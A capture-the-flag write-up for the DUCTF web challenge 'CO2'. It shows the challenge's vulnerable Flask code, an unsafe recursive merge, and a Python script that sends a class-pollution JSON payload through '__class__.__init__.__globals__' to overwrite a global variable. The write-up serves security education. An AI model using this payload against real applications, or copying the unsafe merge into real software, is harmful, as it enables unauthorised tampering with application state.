# CO2

Category: Web (Easy)

Points: 100

Solves: 289

>A group of students who don't like to do things the "conventional" way decided to come up with a CyberSecurity Blog post. You've been hired to perform an in-depth whitebox test on their web application.



### Solution

After parsing through all the source code and website features we can see our main goal:

```py
# routes.py file
...
flag = os.getenv("flag")

# Not quite sure how many fields we want for this, lets just collect these bits now and increase them later. 
# Is it possible to dynamically add fields to this object based on the fields submitted by users?
class Feedback:
    def __init__(self):
        self.title = ""
        self.content = ""
        self.rating = ""
        self.referred = ""

...

@app.route("/save_feedback", methods=["POST"])
@login_required
def save_feedback():
    data = json.loads(request.data)
    feedback = Feedback()
    # Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object.
    print(data)
    merge(data, feedback)
    save_feedback_to_disk(feedback)
    return jsonify({"success": "true"}), 200

@app.route("/get_flag")
@login_required
def get_flag():
    if flag == "true":
        return "DUCTF{NOT_THE_REAL_FLAG}"
    else:
        return "Nope"
```

```py
# utils.py file
...
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
...
```

It seems like there is a flag enviroment variable set to `"false"` which we need to set to `"true"` to obtain the flag from the `/get_flag` endpoint. The only useful endpoint on the website is the `/save_feedback` endpoint where we post feedback data which gets stored in a `feedback` class and stored on the system.

The vulnerable part seems to be that `/save_feedback` allow us to set any attribute in the `feedback` class. (There are four default options: title, contest, rating, and referred. Any other option will be added through the `merge` function.)

Since we can update any attribute we can use Class Pollution, (Prototype Pollution but in Python) (Also the challenge name CO2 checks out since it's pollution :skull:)(Also the [HackTricks article](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution) has the same merge function :skull::skull:).

Essentially, from Python Classes (just like in SSTI) we can navigate to global vars:

```py
feedback.__class__.__init__.__globals__
# returns a dictionary of all global vars
```

From here we can write a script to pollute feedback and set `flag` to `"true"`:

```py
import requests

cookies = {
    'session': '...',
}

headers = {
    ...
}

json_data = {
    '__class__' : {
        '__init__' : {
            '__globals__': {'flag': 'true'}
        }
    }
}

response = requests.post('https://web-co2-99ded1262ff8ec34.2024.ductf.dev/save_feedback', cookies=cookies, headers=headers, json=json_data)
```

Now going to the `/get_flag` endpoint yields the flag:

![Flag](/images/CO2Flag.png)

### Flag

```DUCTF{_cl455_p0lluti0n_ftw_}```